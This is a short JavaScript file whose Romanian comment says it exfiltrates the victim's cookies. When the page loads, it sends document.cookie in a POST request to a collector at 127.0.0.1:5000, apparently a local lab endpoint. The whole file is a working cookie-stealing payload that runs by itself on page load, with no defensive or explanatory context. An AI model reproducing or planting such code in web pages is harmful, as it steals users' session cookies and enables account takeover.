// script.js
document.addEventListener('DOMContentLoaded', () => {
    // Exfiltrează cookie-urile victimei
    fetch('http://127.0.0.1:5000/api/data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookies: document.cookie })
    });
});
